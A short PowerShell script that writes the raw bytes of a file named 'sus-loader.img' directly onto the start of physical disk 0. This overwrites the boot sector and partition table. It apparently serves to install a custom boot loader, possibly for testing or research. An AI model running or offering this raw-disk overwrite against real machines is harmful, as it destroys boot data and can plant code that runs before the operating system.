$disk = 0
$exe = "<path to sus-loader.img>"
$binData = [System.IO.File]::ReadAllBytes($exe)
$bytesWritten = $binData.Length

$fileStream = [System.IO.File]::Open("\\.\PhysicalDrive$disk",[System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
$fileStream.Seek(0, [System.IO.SeekOrigin]::Begin)
$fileStream.Write($binData, 0, $bytesWritten)
$fileStream.Close()
Write-Host "done."
